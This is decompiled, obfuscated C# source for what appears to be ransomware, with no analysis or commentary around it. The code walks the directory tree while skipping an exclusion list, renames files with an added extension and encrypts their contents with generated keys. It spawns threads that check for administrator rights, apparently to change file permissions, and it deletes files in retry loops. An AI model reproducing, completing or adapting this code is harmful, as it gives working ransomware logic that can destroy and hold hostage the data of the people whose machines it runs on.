using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using BulNWfwtwrJjybP;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace CXUnSAPANzkE;

internal sealed class arFNxqUpEFyGtTT
{
	public sealed class sOyIZRPurmEXm
	{
		private static StringCollection qWxMaOHQAwBjW;

		private static List<string> BqIYufUWArylHjSRz;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107407766));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107393914)) && !text.ToLower().Contains(getString_0(107407761)) && !text.ToLower().Contains(getString_0(107393368)) && !text.ToLower().Contains(getString_0(107393387)) && !text.ToLower().Contains(getString_0(107407780)) && !text.ToLower().Contains(getString_0(107393341)) && !text.ToLower().Contains(getString_0(107393193)) && !text.ToLower().Contains(getString_0(107393144)) && !text.ToLower().Contains(getString_0(107393159)) && !text.ToLower().Contains(getString_0(107393622)) && !text.ToLower().Contains(getString_0(107393588)) && !text.ToLower().Contains(getString_0(107393603)) && !text.ToLower().Contains(getString_0(107393554)) && !text.ToLower().Contains(getString_0(107393573)) && !text.ToLower().Contains(getString_0(107393520)) && !text.ToLower().Contains(getString_0(107393539)) && !text.ToLower().Contains(getString_0(107393494)) && !text.ToLower().Contains(getString_0(107393509)) && !text.ToLower().Contains(getString_0(107393460)) && !text.Contains(tjPFETNBnBMzUXk(getString_0(107393475))) && !text.Contains(getString_0(107393450)) && !text.Contains(getString_0(107393437)) && !text.EndsWith(getString_0(107395984)) && !text.EndsWith(getString_0(107393412)) && !text.EndsWith(getString_0(107393407)) && !text.EndsWith(getString_0(107392858)) && !text.EndsWith(getString_0(107392853)) && !text.ToLower().Contains(getString_0(107392848)) && !text.ToLower().Contains(CrIMGxZNxmnsF))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(VQcuZcdUECpj) * 1024.0 * 1024.0 && cIxqzYzUXVduz == getString_0(107396967))
							{
								BqIYufUWArylHjSRz.Add(text);
							}
							else if (File.Exists(text) && cIxqzYzUXVduz == getString_0(107396424))
							{
								BqIYufUWArylHjSRz.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return BqIYufUWArylHjSRz;
		}

		static sOyIZRPurmEXm()
		{
			Strings.CreateGetStringDelegate(typeof(sOyIZRPurmEXm));
			qWxMaOHQAwBjW = new StringCollection();
			BqIYufUWArylHjSRz = new List<string>();
		}
	}

	private sealed class NFcTJoyMAlaMTsP
	{
		public string nwAYAbmTKnUjGt;

		public bool _003CMain_003Eb__5(Process process_0)
		{
			return process_0.ProcessName == nwAYAbmTKnUjGt;
		}
	}

	private sealed class HodDzwKVtgQ
	{
		private sealed class nrgETWiaiUK
		{
			public HodDzwKVtgQ IjsltDfwDzUt;

			public string HKWFUJQtGU;

			public void _003CCrypt_003Eb__1f()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					lILGxkcTMYRwGThf(WindowsIdentity.GetCurrent().Name, HKWFUJQtGU);
				}
			}

			public void _003CCrypt_003Eb__20()
			{
				qzMBtnHAoCT(HKWFUJQtGU, IjsltDfwDzUt.kfhntlBdbyqlPyI, IjsltDfwDzUt.WVKUKadbJyEcF, IjsltDfwDzUt.tXqjlNtlAwegU, IjsltDfwDzUt.cNqEjjpUqBHDJCycCC);
			}
		}

		public string[] kfhntlBdbyqlPyI;

		public string[] tXqjlNtlAwegU;

		public string cNqEjjpUqBHDJCycCC;

		public string WVKUKadbJyEcF;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1e(string string_0)
		{
			nrgETWiaiUK CS_0024_003C_003E8__locals0 = new nrgETWiaiUK();
			CS_0024_003C_003E8__locals0.IjsltDfwDzUt = this;
			CS_0024_003C_003E8__locals0.HKWFUJQtGU = string_0;
			if (bLbMRmlIqKb && !pgBFtwVZlq().Contains(getString_0(107390405)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						lILGxkcTMYRwGThf(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.HKWFUJQtGU);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (HpbWCpkqwlpVpmb == getString_0(107396973))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					qzMBtnHAoCT(CS_0024_003C_003E8__locals0.HKWFUJQtGU, CS_0024_003C_003E8__locals0.IjsltDfwDzUt.kfhntlBdbyqlPyI, CS_0024_003C_003E8__locals0.IjsltDfwDzUt.WVKUKadbJyEcF, CS_0024_003C_003E8__locals0.IjsltDfwDzUt.tXqjlNtlAwegU, CS_0024_003C_003E8__locals0.IjsltDfwDzUt.cNqEjjpUqBHDJCycCC);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				qzMBtnHAoCT(CS_0024_003C_003E8__locals0.HKWFUJQtGU, kfhntlBdbyqlPyI, WVKUKadbJyEcF, tXqjlNtlAwegU, cNqEjjpUqBHDJCycCC);
			}
		}

		static HodDzwKVtgQ()
		{
			Strings.CreateGetStringDelegate(typeof(HodDzwKVtgQ));
		}
	}

	private sealed class iOicLYfXayCEbJ
	{
		private sealed class XbuYXBiSsEmiD
		{
			public iOicLYfXayCEbJ itnzcOJuoNO;

			public string gxCUSkWQwfzunw;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2c()
			{
				foreach (string item in eiWezuyCGKD)
				{
					if (gxCUSkWQwfzunw.ToLower().EndsWith(item + itnzcOJuoNO.TgZlbgeobaAUJX) && xhUXlAlyfax == getString_0(107396984))
					{
						if (Convert.ToInt32(LglvkdAEDeokrPA) * 1024 * 1024 > new FileInfo(gxCUSkWQwfzunw).Length)
						{
							try
							{
								VcazhUwaHziY.bQfUCjfaQPg(getString_0(107393736), getString_0(107393731), getString_0(107393750), gxCUSkWQwfzunw);
							}
							catch
							{
							}
						}
					}
					else if (gxCUSkWQwfzunw.ToLower().EndsWith(item) && xhUXlAlyfax == getString_0(107396441))
					{
						try
						{
							VcazhUwaHziY.bQfUCjfaQPg(getString_0(107393736), getString_0(107393731), getString_0(107393750), gxCUSkWQwfzunw);
						}
						catch
						{
						}
					}
				}
			}

			static XbuYXBiSsEmiD()
			{
				Strings.CreateGetStringDelegate(typeof(XbuYXBiSsEmiD));
			}
		}

		private sealed class tUsqmcfKvfUs
		{
			public iOicLYfXayCEbJ itnzcOJuoNO;

			public string yjymTnfyumAdTQN;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2e()
			{
				foreach (string item in eiWezuyCGKD)
				{
					if (yjymTnfyumAdTQN.ToLower().EndsWith(item + itnzcOJuoNO.TgZlbgeobaAUJX) && xhUXlAlyfax == getString_0(107396987))
					{
						if (Convert.ToInt32(LglvkdAEDeokrPA) * 1024 * 1024 > new FileInfo(yjymTnfyumAdTQN).Length)
						{
							try
							{
								VcazhUwaHziY.bQfUCjfaQPg(getString_0(107393739), getString_0(107393734), getString_0(107393753), yjymTnfyumAdTQN);
							}
							catch
							{
							}
						}
					}
					else if (yjymTnfyumAdTQN.ToLower().EndsWith(item) && xhUXlAlyfax == getString_0(107396444))
					{
						try
						{
							VcazhUwaHziY.bQfUCjfaQPg(getString_0(107393739), getString_0(107393734), getString_0(107393753), yjymTnfyumAdTQN);
						}
						catch
						{
						}
					}
				}
			}

			static tUsqmcfKvfUs()
			{
				Strings.CreateGetStringDelegate(typeof(tUsqmcfKvfUs));
			}
		}

		public List<string> KWOxGmriSwhi;

		public List<string> sgLbAoBHxjjEl;

		public string TgZlbgeobaAUJX;

		public string[] sIKBGqcsXgr;

		public string OFTUyyIDOSKVU;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2b(string string_0)
		{
			XbuYXBiSsEmiD CS_0024_003C_003E8__locals0;
			foreach (string item in sgLbAoBHxjjEl)
			{
				if (sIKBGqcsXgr.Length != 0)
				{
					string[] array = sIKBGqcsXgr;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_06c5;
					}
				}
				try
				{
					if (item.EndsWith(TgZlbgeobaAUJX))
					{
						goto IL_06c5;
					}
				}
				catch (Exception)
				{
					goto IL_06c5;
				}
				if (!item.EndsWith(string_0) || mfvCVNdCLAD.Contains(item))
				{
					continue;
				}
				if (NjvrgrwIrOwQYj == getString_0(107396981))
				{
					try
					{
						if (MbhBjoLLIvI.dGmUmyWLGZeH(item))
						{
							MbhBjoLLIvI.zNzGMfskfSVrmv(item);
						}
					}
					catch
					{
					}
				}
				mfvCVNdCLAD.Add(item);
				if (!PYEHnBxJBpISsEZ.Contains(Path.GetDirectoryName(item)))
				{
					PYEHnBxJBpISsEZ.Add(Path.GetDirectoryName(item));
				}
				PKUMNiKoIzP(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (geeOWbkDyamU)
						{
							try
							{
								File.AppendAllText(UvHPjcAlchtwE, getString_0(107390547) + item + getString_0(107407745) + ex2.Message + getString_0(107396290));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_00ef;
					}
					if (JxuqTkcAaBSWi == getString_0(107396981) && new FileInfo(item).Length > Convert.ToInt32(LSeqdHjjsVhLqcK) * 1024 * 1024 && !KWOxGmriSwhi.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new XbuYXBiSsEmiD();
						CS_0024_003C_003E8__locals0.itnzcOJuoNO = this;
						try
						{
							if (TgZlbgeobaAUJX != getString_0(107389756))
							{
								File.Move(item, item + TgZlbgeobaAUJX);
							}
						}
						catch (Exception ex4)
						{
							if (geeOWbkDyamU)
							{
								try
								{
									File.AppendAllText(UvHPjcAlchtwE, getString_0(107390547) + item + getString_0(107407172) + ex4.Message + getString_0(107396290));
									break;
								}
								catch (Exception)
								{
									break;
								}
							}
							break;
						}
						CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw = getString_0(107393684);
						if (TgZlbgeobaAUJX != getString_0(107389756))
						{
							CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw = item + TgZlbgeobaAUJX;
						}
						else
						{
							CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw = item;
						}
						if (pXuFbktiBaug == getString_0(107396981))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in eiWezuyCGKD)
								{
									if (CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.itnzcOJuoNO.TgZlbgeobaAUJX) && xhUXlAlyfax == XbuYXBiSsEmiD.getString_0(107396984))
									{
										if (Convert.ToInt32(LglvkdAEDeokrPA) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw).Length)
										{
											try
											{
												VcazhUwaHziY.bQfUCjfaQPg(XbuYXBiSsEmiD.getString_0(107393736), XbuYXBiSsEmiD.getString_0(107393731), XbuYXBiSsEmiD.getString_0(107393750), CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw.ToLower().EndsWith(item2) && xhUXlAlyfax == XbuYXBiSsEmiD.getString_0(107396441))
									{
										try
										{
											VcazhUwaHziY.bQfUCjfaQPg(XbuYXBiSsEmiD.getString_0(107393736), XbuYXBiSsEmiD.getString_0(107393731), XbuYXBiSsEmiD.getString_0(107393750), CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = gXHJYnPwPTXJZrM.QJQnnaFXKLEZHqqtt(32);
						string s = iPvNPprVZgkkcgBs.qDBKGOSTlO(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = kmTsQwtQtSP.NcNnNwTCeGFfUCQ(CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw, Convert.ToInt32(LSeqdHjjsVhLqcK) * 1024 * 1024);
						kmTsQwtQtSP.otKhkMkTCKxm(SBpyubiQshOJ: (!jwIpebsbuTtJKU) ? (HHLzNKWftxhcT ? kmTsQwtQtSP.TYTkjjNuoqpT(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : kmTsQwtQtSP.TYTkjjNuoqpT(byte_, Encoding.ASCII.GetBytes(OFTUyyIDOSKVU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (HHLzNKWftxhcT ? aEtMEwYsisfP.GoUQnzNgJTz(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : aEtMEwYsisfP.GoUQnzNgJTz(byte_, Encoding.ASCII.GetBytes(OFTUyyIDOSKVU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), eAyEKDDtpuvhy: CS_0024_003C_003E8__locals0.gxCUSkWQwfzunw, zrqCelPaojIsk: bytes);
					}
					else
					{
						string text2 = gXHJYnPwPTXJZrM.QJQnnaFXKLEZHqqtt(32);
						string s2 = iPvNPprVZgkkcgBs.qDBKGOSTlO(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (TgZlbgeobaAUJX != getString_0(107389756))
						{
							if (!aDzhxFxDvB)
							{
								if (!HHLzNKWftxhcT)
								{
									JWhESarpabglUv(item, item + TgZlbgeobaAUJX, JkKFSdXHCQ);
								}
								else
								{
									JWhESarpabglUv(item, item + TgZlbgeobaAUJX, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!HHLzNKWftxhcT)
									{
										LNWGGHbYeYwY(item, item + TgZlbgeobaAUJX, JkKFSdXHCQ);
									}
									else
									{
										LNWGGHbYeYwY(item, item + TgZlbgeobaAUJX, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (geeOWbkDyamU)
									{
										try
										{
											File.AppendAllText(UvHPjcAlchtwE, getString_0(107390547) + item + getString_0(107389774) + ex6.Message + getString_0(107396290));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!aDzhxFxDvB)
						{
							if (!HHLzNKWftxhcT)
							{
								JWhESarpabglUv(item, item + getString_0(107389783), JkKFSdXHCQ);
							}
							else
							{
								JWhESarpabglUv(item, item + getString_0(107389783), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!HHLzNKWftxhcT)
								{
									LNWGGHbYeYwY(item, item, JkKFSdXHCQ);
								}
								else
								{
									LNWGGHbYeYwY(item, item, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (geeOWbkDyamU)
								{
									try
									{
										File.AppendAllText(UvHPjcAlchtwE, getString_0(107390547) + item + getString_0(107389774) + ex8.Message + getString_0(107396290));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (HHLzNKWftxhcT)
						{
							if (TgZlbgeobaAUJX != getString_0(107389756))
							{
								oDYBJqpCnUcVu(item + TgZlbgeobaAUJX, bytes2);
							}
							else
							{
								oDYBJqpCnUcVu(item, bytes2);
							}
						}
					}
					goto IL_06c5;
					end_IL_00ef:;
				}
				catch (Exception)
				{
					goto IL_06c5;
				}
				continue;
				IL_06c5:
				sgLbAoBHxjjEl.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2d(string string_0)
		{
			tUsqmcfKvfUs CS_0024_003C_003E8__locals0 = new tUsqmcfKvfUs();
			CS_0024_003C_003E8__locals0.itnzcOJuoNO = this;
			CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN = string_0;
			if (sIKBGqcsXgr.Length != 0)
			{
				string[] array = sIKBGqcsXgr;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0748;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN.EndsWith(TgZlbgeobaAUJX))
				{
					goto IL_0748;
				}
			}
			catch (Exception)
			{
				goto IL_0748;
			}
			if (!mfvCVNdCLAD.Contains(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN))
			{
				if (NjvrgrwIrOwQYj == getString_0(107396981))
				{
					try
					{
						if (MbhBjoLLIvI.dGmUmyWLGZeH(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN))
						{
							MbhBjoLLIvI.zNzGMfskfSVrmv(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN);
						}
					}
					catch
					{
					}
				}
				mfvCVNdCLAD.Add(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN);
				if (!PYEHnBxJBpISsEZ.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN)))
				{
					PYEHnBxJBpISsEZ.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN));
				}
				PKUMNiKoIzP(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (geeOWbkDyamU)
						{
							try
							{
								File.AppendAllText(UvHPjcAlchtwE, getString_0(107390547) + CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + getString_0(107407745) + ex2.Message + getString_0(107396290));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_0117_2;
					}
					if (JxuqTkcAaBSWi == getString_0(107396981) && new FileInfo(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN).Length > Convert.ToInt32(LSeqdHjjsVhLqcK) * 1024 * 1024)
					{
						try
						{
							if (TgZlbgeobaAUJX != getString_0(107389756))
							{
								File.Move(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + TgZlbgeobaAUJX);
							}
						}
						catch (Exception ex4)
						{
							if (geeOWbkDyamU)
							{
								try
								{
									File.AppendAllText(UvHPjcAlchtwE, getString_0(107390547) + CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + getString_0(107407172) + ex4.Message + getString_0(107396290));
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
							return;
						}
						if (TgZlbgeobaAUJX != getString_0(107389756))
						{
							CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN += TgZlbgeobaAUJX;
						}
						if (pXuFbktiBaug == getString_0(107396981))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in eiWezuyCGKD)
								{
									if (CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.itnzcOJuoNO.TgZlbgeobaAUJX) && xhUXlAlyfax == tUsqmcfKvfUs.getString_0(107396987))
									{
										if (Convert.ToInt32(LglvkdAEDeokrPA) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN).Length)
										{
											try
											{
												VcazhUwaHziY.bQfUCjfaQPg(tUsqmcfKvfUs.getString_0(107393739), tUsqmcfKvfUs.getString_0(107393734), tUsqmcfKvfUs.getString_0(107393753), CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN.ToLower().EndsWith(item) && xhUXlAlyfax == tUsqmcfKvfUs.getString_0(107396444))
									{
										try
										{
											VcazhUwaHziY.bQfUCjfaQPg(tUsqmcfKvfUs.getString_0(107393739), tUsqmcfKvfUs.getString_0(107393734), tUsqmcfKvfUs.getString_0(107393753), CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = gXHJYnPwPTXJZrM.QJQnnaFXKLEZHqqtt(32);
						string s = iPvNPprVZgkkcgBs.qDBKGOSTlO(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = kmTsQwtQtSP.NcNnNwTCeGFfUCQ(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, Convert.ToInt32(LSeqdHjjsVhLqcK) * 1024 * 1024);
						kmTsQwtQtSP.otKhkMkTCKxm(SBpyubiQshOJ: (!jwIpebsbuTtJKU) ? (HHLzNKWftxhcT ? kmTsQwtQtSP.TYTkjjNuoqpT(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : kmTsQwtQtSP.TYTkjjNuoqpT(byte_, Encoding.ASCII.GetBytes(OFTUyyIDOSKVU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (HHLzNKWftxhcT ? aEtMEwYsisfP.GoUQnzNgJTz(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : aEtMEwYsisfP.GoUQnzNgJTz(byte_, Encoding.ASCII.GetBytes(OFTUyyIDOSKVU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), eAyEKDDtpuvhy: CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, zrqCelPaojIsk: bytes);
					}
					else
					{
						string text2 = gXHJYnPwPTXJZrM.QJQnnaFXKLEZHqqtt(32);
						string s2 = iPvNPprVZgkkcgBs.qDBKGOSTlO(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (TgZlbgeobaAUJX != getString_0(107389756))
						{
							if (!aDzhxFxDvB)
							{
								if (!HHLzNKWftxhcT)
								{
									JWhESarpabglUv(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + TgZlbgeobaAUJX, JkKFSdXHCQ);
								}
								else
								{
									JWhESarpabglUv(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + TgZlbgeobaAUJX, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!HHLzNKWftxhcT)
									{
										LNWGGHbYeYwY(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + TgZlbgeobaAUJX, JkKFSdXHCQ);
									}
									else
									{
										LNWGGHbYeYwY(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + TgZlbgeobaAUJX, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (geeOWbkDyamU)
									{
										try
										{
											File.AppendAllText(UvHPjcAlchtwE, getString_0(107390547) + CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + getString_0(107389774) + ex6.Message + getString_0(107396290));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!aDzhxFxDvB)
						{
							if (!HHLzNKWftxhcT)
							{
								JWhESarpabglUv(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + getString_0(107389783), JkKFSdXHCQ);
							}
							else
							{
								JWhESarpabglUv(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + getString_0(107389783), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!HHLzNKWftxhcT)
								{
									LNWGGHbYeYwY(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, JkKFSdXHCQ);
								}
								else
								{
									LNWGGHbYeYwY(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (geeOWbkDyamU)
								{
									try
									{
										File.AppendAllText(UvHPjcAlchtwE, getString_0(107390547) + CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + getString_0(107389774) + ex8.Message + getString_0(107396290));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (HHLzNKWftxhcT)
						{
							if (TgZlbgeobaAUJX != getString_0(107389756))
							{
								oDYBJqpCnUcVu(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN + TgZlbgeobaAUJX, bytes2);
							}
							else
							{
								oDYBJqpCnUcVu(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0748;
			IL_0748:
			sgLbAoBHxjjEl.Remove(CS_0024_003C_003E8__locals0.yjymTnfyumAdTQN);
		}

		static iOicLYfXayCEbJ()
		{
			Strings.CreateGetStringDelegate(typeof(iOicLYfXayCEbJ));
		}
	}

	private sealed class fDwEtSuXSxJBuR
	{
		public string WqSRVcNJKBpb;

		public string olhyjfhvpIWUIA;

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					File.Delete(WqSRVcNJKBpb);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3c()
		{
			while (true)
			{
				try
				{
					if (File.Exists(olhyjfhvpIWUIA))
					{
						File.Delete(olhyjfhvpIWUIA);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string XTNtJjAvASbm;

	public static byte[] JkKFSdXHCQ;

	public static string cIxqzYzUXVduz;

	public static string VQcuZcdUECpj;

	public static List<string> PelwIoYLMluwkT;

	public static List<string> NlUoosbgDN;

	public static string aNVPohsbWbid;

	public static string OFTUyyIDOSKVU;

	public static string WFhUCfopZvgdKa;

	public static string iWUecWvWvdy;

	public static int aSuWOKqpTFWLZt;

	public static string NjvrgrwIrOwQYj;

	public static string VpJGOcUaTwfpij;

	public static string mqeQDptBukI;

	public static string hYdMzWyQBJgl;

	public static string dqMjwzdylpdLK;

	public static string KpXSYjCAPyvtw;

	public static string ihApggwfGvkG;

	public static string SotcHURFSsO;

	public static List<string> pjYhYVVkRFVa;

	public static List<string> PYEHnBxJBpISsEZ;

	public static string MblmlkeceAY;

	public static string FJXsFcPZKBWlNn;

	public static string oVErvisfbdnQp;

	public static List<string> mfvCVNdCLAD;

	public static string WdQFHfcExMiYlnK;

	private static string AtNcgpYdstMFwdNy;

	public static string HpbWCpkqwlpVpmb;

	public static string eKcpSjrBmJYP;

	public static List<string> UitWgaprnpOe;

	public static List<string> MUKeFWwqRbsUt;

	public static List<string> QxnFKMJGHHM;

	public static List<string> tYFycaveyEZlTZa;

	public static string yaObxwDYeQoq;

	public static List<string> DZKPMstogvMqutY;

	public static List<string> jGCPbbWylwhkiZ;

	public static string aWvdmtYWLU;

	public static string DRlOGAWkgnPyhTM;

	internal static DateTime fpPKoegyFTl;

	internal static DateTime odkofmjGNehiR;

	public static string JxuqTkcAaBSWi;

	public static string LSeqdHjjsVhLqcK;

	public static string EgQwzOCvnHMPfG;

	public static string SmtRihlsiEMW;

	public static string HuXyLjhiTYuOC;

	public static string svEcVjBTCnuAYEoPH;

	public static string FLSEvrhuWfJ;

	public static string pXuFbktiBaug;

	public static List<string> eiWezuyCGKD;

	public static string xhUXlAlyfax;

	public static string LglvkdAEDeokrPA;

	public static string gDLhAzrZSKssbSP;

	public static string TOzFyVZevgZt;

	public static string iMYZrEovwwqNE;

	public static string xNSqMIOLMLAwy;

	public static string VMmbarXfpds;

	public static string MAIfUAvpaRAOicbA;

	public static string dOhNMoendime;

	public static string ZuONjNkcSQG;

	public static string BsEhNrYEPyIbuei;

	public static string BYECuHinFzglbhHW;

	public static string YIPXGAmIVTAgIi;

	public static string YmTiJprAuyeUnyd;

	public static string LRFgFKajMFF;

	public static string iTtbTuAkveiFQ;

	public static string ynsgvIeaItiOAP;

	public static string MeHrIQtFIeB;

	public static string cCTuunwfNioo;

	public static string CrIMGxZNxmnsF;

	public static string HazSUKRRBl;

	public static string oFPgjCRDHeJnCyn;

	public static string xoOIzmzChOZBJa;

	public static string lAoTEijSeOCrur;

	public static string JdCefxYFMIQXhE;

	public static string VbexJOEZOrg;

	public static string vKGebXPGqUoRq;

	public static string UmYbFPakVvjG;

	public static string OVsecWAEVkGcGjJDv;

